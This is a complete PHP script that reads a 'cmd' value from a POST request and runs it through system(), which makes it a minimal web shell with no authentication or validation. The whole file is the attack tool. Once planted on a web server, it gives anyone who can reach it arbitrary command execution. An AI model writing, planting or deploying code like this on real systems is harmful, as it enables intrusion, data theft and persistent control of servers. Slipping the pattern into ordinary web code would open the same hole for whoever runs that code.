<?php
function execute($com)
{
    system($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>